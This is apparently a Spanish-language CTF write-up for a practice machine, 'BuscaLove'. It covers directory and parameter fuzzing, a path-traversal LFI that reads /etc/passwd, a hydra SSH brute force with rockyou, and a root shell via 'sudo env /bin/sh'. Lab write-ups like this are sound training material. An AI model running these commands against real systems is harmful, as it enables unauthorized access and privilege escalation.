---
description: '🧠Dificultad: Fácil | 🔓01/09/2025'
---

# BuscaLove

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`:

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Si nos vamos al navegador y ponemos la IP, nos muestra la página por defecto de Apache. Podemos ver directorios ocultos con `ffuf`:

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://$IPTARGET/FUZZ
```

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Vemos que existe un directorio llamado `/wordpress` con el siguiente contenido:

<div align="left"><figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure></div>

Es una página sencilla sin CSS ni ningún enlace externo. El código fuente de la página tampoco nos dice nada. Si realizamos otro fuzzing sobre el directorio wordpress:

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt:FUZZ -u http://$IPTARGET/wordpress/FUZZ -e .html,.php,.txt,.xml,.js
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Vemos que solo está el index.php. Podemos probar a fuzzear parámetros para ver si la página es vulnerable a LFI.

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u "http://$IPTARGET/wordpress/index.php?FUZZ=../../../../../../../etc/passwd" -fs 1048
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption><p>Llegar a esta parte de la solución no fue nada fácil para mi xd</p></figcaption></figure>

Existe un parámetro `love` que es vulnerable a `LFI`. Con él, podemos ver el archivo `/etc/passwd` del sistema.

```url
http://<IP-MAQUINA>/wordpress?love=../../../../../../../etc/passwd
```

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

## 🚪 Ganando acceso

El fichero nos muestra que hay dos usuarios que poseen un shell válido (`/bin/bash`). Probando fuerza bruta con `hydra`, obtenemos un acierto para el usuario `rosa` y la wordlist de `rockyou`.&#x20;

```bash
hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://$IPTARGET -t 20 -I
```

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Una vez dentro del sistema, comprobamos los permisos que tenemos con `sudo -l`, lo que nos muestra que tenemos permisos como `root` (o cualquier usuario) para el binario `ls` y `cat`.

Hablando con un amigo, me comentó que su camino fue distinto, y es que en este momento tienes dos opciones:

1. Listar el directorio `/root` y seguir por ahí.
2. Alternativa: hacer `cat` al fichero `/etc/shadow` y crackear por fuerza bruta la contraseña de `root` o la de `pedro`.

A continuación mostraré la opción 1 que es la que seguí yo, pero la opción 2 también va bien encaminada para resolver la máquina.

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

El directorio `/root` contiene un fichero con un contenido en hexadecimal. Si decodificamos con `xxd`, obtenemos la cadena `NZXWCY3F0J2GC4TB0NXXG2IK`. Si pasamos esta cadena por [cyberchef](https://gchq.github.io/CyberChef/), nos muestra que está codificada en Base32.

<div align="left" data-full-width="false"><figure><img src="../../.gitbook/assets/image (47).png" alt="" width="221"><figcaption></figcaption></figure></div>

Probamos como contraseña para el usuario `pedro` anteriormente visto:

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Una vez dentro, volvemos a consultar los permisos con `sudo` para este usuario:

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Podemos ejecutar el binario `env` como `root`. Si buscamos algún exploit para este binario en [gtfobins](https://gtfobins.github.io/), vemos que ejecutando `sudo env /bin/sh` obtenemos una shell como `root`:

<div align="left"><figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure></div>
